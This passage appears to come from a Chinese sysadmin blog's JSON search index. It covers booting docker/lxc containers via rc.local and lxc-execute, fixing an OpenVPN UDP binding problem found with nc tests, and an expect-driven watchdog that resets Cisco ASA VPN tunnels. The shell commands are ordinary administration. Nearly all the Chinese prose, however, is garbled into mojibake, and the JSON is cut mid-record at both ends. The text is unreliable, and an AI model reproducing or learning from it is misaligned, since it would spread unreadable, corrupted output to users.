ä¸ºæˆ‘ä»¬æ˜¯å¼ºç½‘ç»œç®¡ç†ç¯å¢ƒï¼Œç½‘ç»œå·¥ç¨‹å¸ˆå¯¹ç½‘ç»œçš„è§„åˆ’å’Œç®¡æ§éå¸¸å¼ºã€‚\nè¿™ç§æ–¹å¼ä¸‹å¯åŠ¨lxcå®¹å™¨å€’æ˜¯å¾ˆå¥½åŠï¼Œç›´æ¥ç¼–è¾‘/etc/rc.d/rc.local\ndocker start jko2o-16-13-49 docker start vis-16-13-51 docker start vis-16-13-50 docker start vis-16-13-48 docker start vis-16-13-47 å°±å¯ä»¥å¼€æœºè‡ªåŠ¨å¯åŠ¨å®¹å™¨äº†ã€‚\nå®¹å™¨å†…æˆ‘ä»¬æ˜¯é‡‡ç”¨supervisordä¸»è¿›ç¨‹æ¥ä¿æŒå®¹å™¨ä¸è‡ªåŠ¨é”€æ¯çš„ï¼Œé‚£ä¹ˆå…¶ä»–å‘½ä»¤å¦‚æœéƒ½åŠ å…¥supervisordï¼Œé‚£ä¼šéå¸¸éº»çƒ¦ã€‚\nç®€å•åŒ–ï¼Œç”¨lxc-executeæ¥æ‰§è¡Œï¼Œæ¯”è¾ƒéº»çƒ¦çš„å°±æ˜¯éœ€è¦æŸ¥å‡ºæ¥lxcå®¹å™¨çš„åå­—ï¼Œç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥å‡ºjko2o-16-13-49çš„å…¨åï¼š\ndocker inspect -f \u0026#39;{{.Id}}\u0026#39; jko2o-16-13-49 ebe2e6a1249f6f22334014b0072186dfaee52173f3df06cd826f9e64e7d4c51f ç„¶åç¼–è¾‘/etc/rc.d/rc.localï¼Œç”¨lxc-executeæ‰§è¡Œå‘½ä»¤å°±å¯ä»¥äº†ï¼š\n#47 lxc-execute -n e223d81ea73551460b82e1977b92ef07e24437cd1f4494470feafd4ff455104b -- service mysqld start lxc-execute -n e223d81ea73551460b82e1977b92ef07e24437cd1f4494470feafd4ff455104b -- service httpd start #48 lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/mysqld start lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/httpd start lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/wdapache start lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/nginxd start lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/pureftpd start #49 lxc-execute -n ebe2e6a1249f6f22334014b0072186dfaee52173f3df06cd826f9e64e7d4c51f -- /export/servers/nginx178/sbin/nginx #50 lxc-execute -n 5b7e8cd3130d31bae5b089202c7e2092b9daca5f19cc055ce4ee50cf8b789504 -- /export/servers/tomcat/tomcat.sh ","permalink":"https://rendoumi.com/posts/20240108-docker_lxc_startup/","summary":"\u003cp\u003eæˆ‘ä»¬çš„å®¹å™¨é‡‡ç”¨çš„æ˜¯lxcç±»å‹ï¼Œä¸€æ˜¯ä¸ºäº†å›ºå®šipï¼ŒäºŒæ˜¯é¿å¼€iptableç±»å‹è½¬å‘çš„æ–¹å¼ã€‚å› ä¸ºæˆ‘ä»¬æ˜¯å¼ºç½‘ç»œç®¡ç†ç¯å¢ƒï¼Œç½‘ç»œå·¥ç¨‹å¸ˆå¯¹ç½‘ç»œçš„è§„åˆ’å’Œç®¡æ§éå¸¸å¼ºã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ç§æ–¹å¼ä¸‹å¯åŠ¨lxcå®¹å™¨å€’æ˜¯å¾ˆå¥½åŠï¼Œç›´æ¥ç¼–è¾‘/etc/rc.d/rc.local\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker start jko2o-16-13-49  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker start vis-16-13-51  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker start vis-16-13-50  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker start vis-16-13-48  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker start vis-16-13-47  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå°±å¯ä»¥å¼€æœºè‡ªåŠ¨å¯åŠ¨å®¹å™¨äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå®¹å™¨å†…æˆ‘ä»¬æ˜¯é‡‡ç”¨supervisordä¸»è¿›ç¨‹æ¥ä¿æŒå®¹å™¨ä¸è‡ªåŠ¨é”€æ¯çš„ï¼Œé‚£ä¹ˆå…¶ä»–å‘½ä»¤å¦‚æœéƒ½åŠ å…¥supervisordï¼Œé‚£ä¼šéå¸¸éº»çƒ¦ã€‚\u003c/p\u003e\n\u003cp\u003eç®€å•åŒ–ï¼Œç”¨lxc-executeæ¥æ‰§è¡Œï¼Œæ¯”è¾ƒéº»çƒ¦çš„å°±æ˜¯éœ€è¦æŸ¥å‡ºæ¥lxcå®¹å™¨çš„åå­—ï¼Œç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥å‡ºjko2o-16-13-49çš„å…¨åï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker inspect -f \u003cspan class=\"s1\"\u003e\u0026#39;{{.Id}}\u0026#39;\u003c/span\u003e jko2o-16-13-49  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eebe2e6a1249f6f22334014b0072186dfaee52173f3df06cd826f9e64e7d4c51f  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åç¼–è¾‘/etc/rc.d/rc.localï¼Œç”¨lxc-executeæ‰§è¡Œå‘½ä»¤å°±å¯ä»¥äº†ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#47\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n e223d81ea73551460b82e1977b92ef07e24437cd1f4494470feafd4ff455104b -- service mysqld start  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n e223d81ea73551460b82e1977b92ef07e24437cd1f4494470feafd4ff455104b -- service httpd start  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#48\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/mysqld start  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/httpd start  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/wdapache start  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/nginxd start  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/pureftpd start  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#49\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n ebe2e6a1249f6f22334014b0072186dfaee52173f3df06cd826f9e64e7d4c51f -- /export/servers/nginx178/sbin/nginx  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#50\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elxc-execute -n 5b7e8cd3130d31bae5b089202c7e2092b9daca5f19cc055ce4ee50cf8b789504 -- /export/servers/tomcat/tomcat.sh  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4\u003e\u003c/h4\u003e","title":"docker lxcç±»å‹å®¹å™¨è‡ªå¯åŠ¨ä»¥åŠè‡ªåŠ¨æ‰§è¡Œå‘½ä»¤"},{"content":"openvpn server can\u0026rsquo;t use udp port è¿™ä¸ªé—®é¢˜éå¸¸å¤æ€ªï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªæœºæˆ¿ã€‚åˆ†åˆ«åœ¨ä¸¤è¾¹å‡è®¾äº†openvpnæœåŠ¡å™¨ï¼Œä¸€ä¸ªæœºæˆ¿çš„ovpnå°±å®Œå…¨æ­£å¸¸ï¼Œè€Œå¦ä¸€ä¸ªæœºæˆ¿çš„openvpnå¦‚æœæ˜¯tcpå°±æ²¡é—®é¢˜ï¼Œå¦‚æœæ˜¯udpå°±æŠ¥é”™ï¼Œæ— æ³•è¿æ¥ã€‚æŠŠæ­£å¸¸æœºæˆ¿çš„openvpnå®Œå…¨å¤åˆ¶ä¸€ä»½æ‹¿è¿‡å»ï¼Œä¹Ÿæ˜¯ä¸€æ ·æŠ¥é”™ï¼Œå¤ªéƒé—·äº†ï¼\né”™è¯¯æç¤ºæ˜¯ï¼š\nTLS Error: TLS key negotiation failed to occur within 60 seconds (check your network connectivity) éå¸¸å¤æ€ªå•Šï¼š åœ¨å†…ç½‘ç”¨ncæ¥è¯•éªŒudpæ˜¯å¦æ­£å¸¸ï¼š\nnc -ul 1194 åœ¨å†…ç½‘éšä¾¿æ‰¾ä¸€å°æœºå™¨æµ‹è¯•ï¼š\nnc -u xxxx 1194 ç„¶åä¸¤è¾¹éšä¾¿è¾“å…¥å­—ç¬¦æµ‹è¯•ï¼Œæ²¡é—®é¢˜ã€‚\nç„¶åä»å…¬ç½‘æµ‹è¯•ï¼Œå°±å‡ºé—®é¢˜äº†ã€‚ncè¿æ¥ä¸Šä»¥åï¼Œåªèƒ½å‘é€ä¸€æ¬¡æ•°æ®ï¼Œç„¶åç®¡é“å°±æ–­è£‚äº†ï¼Œæ— æ³•å†ä¼ æ•°æ®ã€‚\nnc -u å…¬ç½‘ip 1194 aaa nc: Write error: Connection refused ç™¾æ€ä¸å¾—å…¶è§£å•Šï¼Œè¯•äº†è‹¥å¹²æ¬¡ï¼Œæ‰å‘ç°é—®é¢˜çš„ç—‡ç»“æ‰€åœ¨ã€‚\né”™è¯¯çš„é‚£å°æœåŠ¡å™¨ï¼Œæœ‰ä¸¤ä¸ªç½‘ç»œåœ°å€ï¼š 172.16.8.4å’Œ172.16.8.1 å…¶ä¸­8.4çš„åœ°å€æ˜¯ç¼ºçœåœ°å€ï¼Œ8.1çš„åœ°å€æ˜¯ç”¨ifconfigæ‰‹åŠ¨åæ·»åŠ çš„ã€‚ è€Œå‰ç«¯é˜²ç«å¢™åšå¾—å…¬ç½‘æ˜ å°„æ˜¯æ˜ å°„åˆ°äº†8.1çš„1194ç«¯å£\ntcpç”±äºåŒæ–¹æ˜¯è¦æ ¡éªŒæ¥å¾€srcåœ°å€çš„ï¼Œæ‰€ä»¥æ²¡é—®é¢˜ï¼Œåˆ°äº†udpï¼Œåªç®¡å‘ä¸ç®¡æ”¶ï¼Œæ‰€ä»¥udpåŒ…å°±ä»8.4çš„ç¼ºçœåœ°å€å‘å‡ºå»ï¼Œå¯¼è‡´åŒæ–¹ä¸ä¸€è‡´ï¼Œæ— æ³•æ­£å¸¸æ¥æ”¶äº†ã€‚\nè§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œåœ¨openvpnæœåŠ¡å™¨ç«¯çš„é…ç½®æ–‡ä»¶ä¸­å¼ºè¡ŒæŒ‡å®šlocalç«¯çš„ipå³å¯ï¼š\nlocal 172.16.8.1 ","permalink":"https://rendoumi.com/posts/20240108-opnevpn_udp_port/","summary":"\u003ch5 id=\"openvpn-server-cant-use-udp-port\"\u003eopenvpn server can\u0026rsquo;t use udp port\u003c/h5\u003e\n\u003cp\u003eè¿™ä¸ªé—®é¢˜éå¸¸å¤æ€ªï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªæœºæˆ¿ã€‚åˆ†åˆ«åœ¨ä¸¤è¾¹å‡è®¾äº†openvpnæœåŠ¡å™¨ï¼Œä¸€ä¸ªæœºæˆ¿çš„ovpnå°±å®Œå…¨æ­£å¸¸ï¼Œè€Œå¦ä¸€ä¸ªæœºæˆ¿çš„openvpnå¦‚æœæ˜¯tcpå°±æ²¡é—®é¢˜ï¼Œå¦‚æœæ˜¯udpå°±æŠ¥é”™ï¼Œæ— æ³•è¿æ¥ã€‚æŠŠæ­£å¸¸æœºæˆ¿çš„openvpnå®Œå…¨å¤åˆ¶ä¸€ä»½æ‹¿è¿‡å»ï¼Œä¹Ÿæ˜¯ä¸€æ ·æŠ¥é”™ï¼Œå¤ªéƒé—·äº†ï¼\u003c/p\u003e\n\u003cp\u003eé”™è¯¯æç¤ºæ˜¯ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTLS Error: TLS key negotiation failed to occur within \u003cspan class=\"m\"\u003e60\u003c/span\u003e seconds \u003cspan class=\"o\"\u003e(\u003c/span\u003echeck your network connectivity\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eéå¸¸å¤æ€ªå•Šï¼š åœ¨å†…ç½‘ç”¨ncæ¥è¯•éªŒudpæ˜¯å¦æ­£å¸¸ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -ul \u003cspan class=\"m\"\u003e1194\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåœ¨å†…ç½‘éšä¾¿æ‰¾ä¸€å°æœºå™¨æµ‹è¯•ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -u xxxx \u003cspan class=\"m\"\u003e1194\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åä¸¤è¾¹éšä¾¿è¾“å…¥å­—ç¬¦æµ‹è¯•ï¼Œæ²¡é—®é¢˜ã€‚\u003c/p\u003e\n\u003cp\u003eç„¶åä»å…¬ç½‘æµ‹è¯•ï¼Œå°±å‡ºé—®é¢˜äº†ã€‚ncè¿æ¥ä¸Šä»¥åï¼Œåªèƒ½å‘é€ä¸€æ¬¡æ•°æ®ï¼Œç„¶åç®¡é“å°±æ–­è£‚äº†ï¼Œæ— æ³•å†ä¼ æ•°æ®ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -u å…¬ç½‘ip \u003cspan class=\"m\"\u003e1194\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaaa  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc: Write error: Connection refused  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç™¾æ€ä¸å¾—å…¶è§£å•Šï¼Œè¯•äº†è‹¥å¹²æ¬¡ï¼Œæ‰å‘ç°é—®é¢˜çš„ç—‡ç»“æ‰€åœ¨ã€‚\u003c/p\u003e\n\u003cp\u003eé”™è¯¯çš„é‚£å°æœåŠ¡å™¨ï¼Œæœ‰ä¸¤ä¸ªç½‘ç»œåœ°å€ï¼š 172.16.8.4å’Œ172.16.8.1\nå…¶ä¸­8.4çš„åœ°å€æ˜¯ç¼ºçœåœ°å€ï¼Œ8.1çš„åœ°å€æ˜¯ç”¨ifconfigæ‰‹åŠ¨åæ·»åŠ çš„ã€‚ è€Œå‰ç«¯é˜²ç«å¢™åšå¾—å…¬ç½‘æ˜ å°„æ˜¯æ˜ å°„åˆ°äº†8.1çš„1194ç«¯å£\u003c/p\u003e\n\u003cp\u003etcpç”±äºåŒæ–¹æ˜¯è¦æ ¡éªŒæ¥å¾€srcåœ°å€çš„ï¼Œæ‰€ä»¥æ²¡é—®é¢˜ï¼Œåˆ°äº†udpï¼Œåªç®¡å‘ä¸ç®¡æ”¶ï¼Œæ‰€ä»¥udpåŒ…å°±ä»8.4çš„ç¼ºçœåœ°å€å‘å‡ºå»ï¼Œå¯¼è‡´åŒæ–¹ä¸ä¸€è‡´ï¼Œæ— æ³•æ­£å¸¸æ¥æ”¶äº†ã€‚\u003c/p\u003e\n\u003cp\u003eè§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œåœ¨openvpnæœåŠ¡å™¨ç«¯çš„é…ç½®æ–‡ä»¶ä¸­å¼ºè¡ŒæŒ‡å®šlocalç«¯çš„ipå³å¯ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elocal\u003c/span\u003e 172.16.8.1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"OpenvpnæœåŠ¡å™¨ç«¯æ— æ³•å¼€é€šudpç«¯å£çš„æ•…éšœæ’é™¤"},{"content":"Cisco ASA5520 VPNçº¿è·¯çš„ç›‘æ§å’Œé‡å¯ å…¬å¸ä»äº‹ç¬¬ä¸‰æ–¹æ”¯ä»˜å·¥ä½œï¼Œè·Ÿå¾ˆå¤šé“¶è¡Œéƒ½æœ‰åˆä½œå…³ç³»ï¼Œæ‹‰äº†å¾ˆå¤šä¸“çº¿ç›´é€šé“¶è¡Œï¼ŒåŒæ–¹å»ºç«‹VPNï¼Œä¸¤ç«¯éƒ½æ˜¯Ciscoçš„è®¾å¤‡ï¼Œä½†æ˜¯ï¼Œè¿™äº›çº¿è·¯æœ‰æ—¶å€™ä¼šè«åå…¶å¦™çš„æ–­æ‰ï¼Œå…³é”®æ˜¯ç¨‹åºä¸çŸ¥é“å•Šï¼Œè€æ˜¯é‡è¿ï¼Œä¸€ç›´ç­‰åˆ°å®¢æœåæ˜ å®¢æˆ·æŠ•è¯‰ï¼ŒæŸ¥ä¸€åœˆç¨‹åºåæ‰çŸ¥é“ã€‚è¿™åœ¨ç”Ÿäº§ç¯å¢ƒä¸Šå¯æ˜¯è¡Œä¸é€šçš„ï¼Œæ‰¾æ¥äº†æ‰€è°“Ciscoé«˜æ‰‹ï¼Œä¹Ÿæä¸æ˜ç™½ä¸ºä»€ä¹ˆè€æ–­ï¼Œæ²¡åŠæ³•ï¼Œäºæ˜¯å†™äº†ä¸¤ä¸ªç›‘æ§è„šæœ¬ï¼Œä½¿ç”¨Pingæ£€æµ‹VPNå¯¹ç«¯çš„çŠ¶å†µï¼Œä¸€æ—¦Pingä¸é€šï¼Œå°±ç”¨è„šæœ¬ç™»é™†é˜²ç«å¢™ï¼Œè‡ªåŠ¨é‡å¯VPNã€‚\nåœ¨å®‰è£…ä¹‹å‰ï¼Œå…ˆå®‰è£…ä¸€ä¸ªèƒ½ä»å‘½ä»¤è¡Œå‘é€é‚®ä»¶çš„è½¯ä»¶Emailæ¥å‘é€æŠ¥è­¦é‚®ä»¶ï¼Œå¦åˆ™æ¯å°æœºå™¨éƒ½èµ·sendmailï¼Œæ²¡ä»€ä¹ˆå¿…è¦:\nhttps://github.com/muquit/mailsend-go #å‘é€å®ä¾‹ mailsend-go -smtp smtp.126.com -port 25 \\ auth \\ -user xxx@126.com -pass xxx \\ -from xxx@126.com -to \u0026#34;xxx@126.com\u0026#34; \\ -sub \u0026#34;Test\u0026#34; \\ body -msg \u0026#39;hello world\u0026#39; 126é‚®ç®±è¿™é‡Œçš„å¯†ç ç”¨çš„æ˜¯æˆæƒç  æˆæƒå¯†ç ï¼Œä¸æ˜¯é‚®ç®±å¯†ç  è¯´æ˜ä¸€ä¸‹åœºæ™¯ï¼š\n210.210.210.3æ˜¯å¯¹ç«¯Cisco vpnè®¾å¤‡çš„å…¬ç½‘IP 192.168.101.99æ˜¯å»ºç«‹äº†VPNåï¼Œå¯¹ç«¯æœåŠ¡å™¨çš„ç§ç½‘IPåœ°å€ï¼› 192.168.1.1æ˜¯å·±æ–¹Cisco ASA5520çš„ç§ç½‘åœ°å€ã€‚ #!/bin/sh while [ \u0026#34;1\u0026#34; -eq \u0026#34;1\u0026#34; ] do live=`ping -c4 \u0026#34;192.168.101.99\u0026#34;|wc -l` if [ $live -eq 5 ] ; then /usr/local/bin/mailsend-go -debug -to \u0026#34;ranrui.zhang@rendoumi.com\u0026#34; -from monit@ddky.com -ssl -port 465 -smtp smtp.qiye.aliyun.com \\ auth -user \u0026#34;monit@ddky.com\u0026#34; -pass \u0026#34;xxxxxxxx\u0026#34; \\ -sub \u0026#34;vpnæ–­äº†\u0026#34; body -msg \u0026#34;`date +%Y`å¹´`date +%m`æœˆ`date +%d`æ—¥ vpnæ–­äº†ï¼ï¼ï¼\u0026#34; \\ -cs \u0026#34;utf-8\u0026#34; /usr/local/bin/revpn.sh echo \u0026#34;`date +%Y`å¹´`date +%m`æœˆ`date +%d`æ—¥ `date +%H`ç‚¹`date +%M`åˆ† çº¿è·¯ä¸èƒ½åˆ°è¾¾ç‹åºœäº•æœºæˆ¿ï¼Œé‡å¯VPNã€‚\u0026#34; sleep 60 fi; sleep 60 done ä»¥ä¸‹æ˜¯ç”¨expectè‡ªåŠ¨ç™»å½•Ciscoè·¯ç”±å™¨é‡å¯vpnçš„è„šæœ¬ revpn.sh\n#!/usr/bin/expect set timeout 30 spawn ssh pix@192.168.1.1 expect \u0026#34;password:\u0026#34; send \u0026#34;xxxxxxxx\\n\u0026#34; expect \u0026#34;ASAtoTelecom\u0026gt;\u0026#34; send \u0026#34;en\\n\u0026#34; expect \u0026#34;Password:\u0026#34; send \u0026#34;xxxxxxxx\\n\u0026#34; expect \u0026#34;ASAtoTelecom#\u0026#34; send \u0026#34;clear isakmp sa\\n\u0026#34; expect \u0026#34;ASAtoTelecom#\u0026#34; send \u0026#34;clear ipsec sa peer 210.210.210.3\\n\u0026#34; expect \u0026#34;ASAtoTelecom#\u0026#34; send \u0026#34;exit\\n\u0026#34; expect eof exit 0 ","permalink":"https://rendoumi.com/posts/20240107-vpn_monitor/","summary":"\u003ch5 id=\"cisco-asa5520-vpnçº¿è·¯çš„ç›‘æ§å’Œé‡å¯\"\u003eCisco ASA5520 VPNçº¿è·¯çš„ç›‘æ§å’Œé‡å¯\u003c/h5\u003e\n\u003cp\u003eå…¬å¸ä»äº‹ç¬¬ä¸‰æ–¹æ”¯ä»˜å·¥ä½œï¼Œè·Ÿå¾ˆå¤šé“¶è¡Œéƒ½æœ‰åˆä½œå…³ç³»ï¼Œæ‹‰äº†å¾ˆå¤šä¸“çº¿ç›´é€šé“¶è¡Œï¼ŒåŒæ–¹å»ºç«‹VPNï¼Œä¸¤ç«¯éƒ½æ˜¯Ciscoçš„è®¾å¤‡ï¼Œä½†æ˜¯ï¼Œè¿™äº›çº¿è·¯æœ‰æ—¶å€™ä¼šè«åå…¶å¦™çš„æ–­æ‰ï¼Œå…³é”®æ˜¯ç¨‹åºä¸çŸ¥é“å•Šï¼Œè€æ˜¯é‡è¿ï¼Œä¸€ç›´ç­‰åˆ°å®¢æœåæ˜ å®¢æˆ·æŠ•è¯‰ï¼ŒæŸ¥ä¸€åœˆç¨‹åºåæ‰çŸ¥é“ã€‚è¿™åœ¨ç”Ÿäº§ç¯å¢ƒä¸Šå¯æ˜¯è¡Œä¸é€šçš„ï¼Œæ‰¾æ¥äº†æ‰€è°“Ciscoé«˜æ‰‹ï¼Œä¹Ÿæä¸æ˜ç™½ä¸ºä»€ä¹ˆè€æ–­ï¼Œæ²¡åŠæ³•ï¼Œäºæ˜¯å†™äº†ä¸¤ä¸ªç›‘æ§è„šæœ¬ï¼Œä½¿ç”¨Pingæ£€æµ‹VPNå¯¹ç«¯çš„çŠ¶å†µï¼Œä¸€æ—¦Pingä¸é€šï¼Œå°±ç”¨è„šæœ¬ç™»é™†é˜²ç«å¢™ï¼Œè‡ªåŠ¨é‡å¯VPNã€‚\u003c/p\u003e\n\u003cp\u003eåœ¨å®‰è£…ä¹‹å‰ï¼Œå…ˆå®‰è£…ä¸€ä¸ªèƒ½ä»å‘½ä»¤è¡Œå‘é€é‚®ä»¶çš„è½¯ä»¶Emailæ¥å‘é€æŠ¥è­¦é‚®ä»¶ï¼Œå¦åˆ™æ¯å°æœºå™¨éƒ½èµ·sendmailï¼Œæ²¡ä»€ä¹ˆå¿…è¦:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://github.com/muquit/mailsend-go\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å‘é€å®ä¾‹\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emailsend-go -smtp smtp.126.com -port \u003cspan class=\"m\"\u003e25\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003eauth \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -user xxx@126.com -pass xxx \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -from xxx@126.com -to  \u003cspan class=\"s2\"\u003e\u0026#34;xxx@126.com\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e-sub \u003cspan class=\"s2\"\u003e\u0026#34;Test\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan 